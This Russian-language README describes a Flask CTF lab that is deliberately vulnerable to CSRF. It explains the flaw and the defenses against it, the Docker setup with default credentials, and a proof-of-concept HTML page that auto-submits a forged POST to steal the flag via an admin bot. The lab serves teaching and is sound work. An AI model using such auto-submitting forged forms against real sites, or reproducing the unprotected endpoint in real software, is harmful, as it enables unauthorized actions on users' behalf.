# Приложение для CTF с уязвимостью CSRF

Это веб-приложение на базе Flask, созданное для демонстрации уязвимости Cross-Site Request Forgery (CSRF) в рамках CTF-задачи. Приложение включает систему аутентификации пользователей, личный кабинет, систему сообщений (inbox), панель администратора для отправки флага и бота, который имитирует действия администратора, посещающего указанные URL.

## Описание уязвимости

### Что такое CSRF?
Cross-Site Request Forgery (CSRF, межсайтовая подделка запросов) — это атака, при которой злоумышленник заставляет аутентифицированного пользователя (или бота) выполнить нежелательное действие в рамках веб-приложения, где он авторизован. Атака использует доверие сайта к браузеру пользователя, отправляя несанкционированные запросы с вредоносного сайта.

### Почему возникает уязвимость?
CSRF-атака возможна, когда:
- Веб-приложение не проверяет происхождение запросов, изменяющих состояние (например, POST-запросов)
- Приложение полагается только на куки или сессионные токены для аутентификации, которые браузер отправляет автоматически
- Отсутствуют механизмы защиты от CSRF, такие как CSRF-токены, SameSite-куки или проверка заголовков Referer

В данном приложении эндпоинт `/send_flag` обрабатывает POST-запросы без проверки их источника, что позволяет вредоносной странице отправить форму от имени авторизованного администратора.

## Способы защиты от CSRF

Для предотвращения CSRF-уязвимостей необходимо:
1. Использование CSRF-токенов: добавлять уникальный, непредсказуемый токен в формы (например, с помощью Flask-WTF) и проверять его на сервере.
2. SameSite-cookies: установить атрибут `SameSite` для сессионных cookies на `Strict` или `Lax`, чтобы запретить межсайтовые запросы.
3. Проверять заголовки Referer/Origin: контролировать, что запросы приходят с доверенного домена.
4. Требовать повторную аутентификацию: для критических действий запрашивать подтверждение пароля.
5. Использовать POST для действий, изменяющих состояние: избегать GET-запросов для таких операций.

## Запуск приложения

### Требования
- Установлены Docker и Docker Compose.
- Система Linux, macOS или Windows с поддержкой Docker.

### Инструкции по запуску
1. Склонируйте или настройте репозиторий:
   Убедитесь, что структура проекта включает:
   - `app/` (Flask-приложение с `app.py`, `templates/`, `Dockerfile`, `requirements.txt`)
   - `bot/` (бот с `bot.py`, `Dockerfile`, `requirements.txt`)
   - `evil/` (вредоносный сервер с `evil.html`)
   - `docker-compose.yml` в корне проекта

2. Запустите приложение:
   docker-compose up -d
   Это запустит:
   - `app`: Flask-приложение на http://localhost:5000
   - `bot`: Selenium-бот на порту 5001 (внутренний)
   - `evil`: HTTP-сервер с `evil.html` на http://localhost:8000

3. Доступ к приложению:
   - Откройте в браузере: http://localhost:5000 — главная страница.
   - Пользователи, создаваемые при запуске:
     - `admin` / `adminpassword` (администратор)
     - `user` / `userpassword` (обычный юзер)
     - `attacker` / `attackerpass` (злоумышленник)
   - Флаг задан в переменной окружения: `practice{csrf_is_bad}`

4. Остановка приложения:
   docker-compose down
   Для сброса базы данных:
   docker-compose down -v

## Уязвимость в данном приложении

Приложение умышленно уязвимо к CSRF на эндпоинте `/send_flag`. Основные проблемы:
- Отсутствие защиты от CSRF: эндпоинт `/send_flag` (POST) не использует CSRF-токены и не проверяет происхождение запроса
- Открытое действие администратора: только администратор может отправлять флаг в inbox пользователя, но эндпоинт принимает любой POST-запрос от аутентифицированной сессии администратора
- Поведение бота: бот (`bot/bot.py`) логинится как `admin` и посещает любой поданый URL, включая вредоносный (`http://evil:8000/evil.html`). Эта страница автоматически отправляет форму на `/send_flag`, отправляя флаг в inbox пользователя `attacker`
- Отсутствие SameSite-cookies: сессионные cookies Flask не используют атрибут `SameSite`, что позволяет межсайтовым запросам нести сессию админа
- Простота формы: форма в `send_flag_form.html` не содержит CSRF-токенов, что упрощает её подделку на вредоносном сайте

Это позволяет атакующему создать страницу (например, `evil.html`), которая при посещении ботом вызывает отправку флага.

## PoC-эксплоит для получения флага

Цель — получить флаг (`practice{csrf_is_bad}`) через эксплуатацию CSRF. Встроенный `evil.html` автоматизирует атаку.

### Шаги выполнения PoC
1 . Отправьте вредоносный URL боту:
   - Перейдите на http://localhost:5000/submit_to_bot
   - В форме введите URL: http://evil:8000/evil.html
   - Нажмите "Submit". Вы увидите сообщение "URL submitted to bot"
   - Что происходит:
     - Бот логинится как `admin` (username: `admin`, password: `adminpassword`)
     - Посещает http://evil:8000/evil.html
     - Страница загружает форму, которая автоматически сабмитится на http://app:5000/send_flag с `recipient=attacker`
     - Флаг отправляется в inbox пользователя `attacker`

2. Получите флаг:
   - Перейдите на http://localhost:5000/login
   - Войдите как:
     - Username: `attacker`
     - Password: `attackerpass`
   - Перейдите в `/inbox` через дашборд
   - Флаг `practice{csrf_is_bad}` появится в списке сообщений

### Кастомный PoC (опционально)
Для создания собственной вредоносной страницы:
- Создайте файл `./evil/custom_evil.html`:
  <!DOCTYPE html>
  <html>
  <body>
  <form id="exploit" action="http://app:5000/send_flag" method="POST">
      <input type="hidden" name="recipient" value="attacker">
  </form>
  <script>
      document.getElementById('exploit').submit();
  </script>
  </body>
  </html>
- Перезапустите:
  docker-compose up -d
- Отправьте боту: http://evil:8000/custom_evil.html

### Ожидаемый результат
Флаг `practice{csrf_is_bad}` появляется в inbox пользователя `attacker`, демонстрируя CSRF-уязвимость.
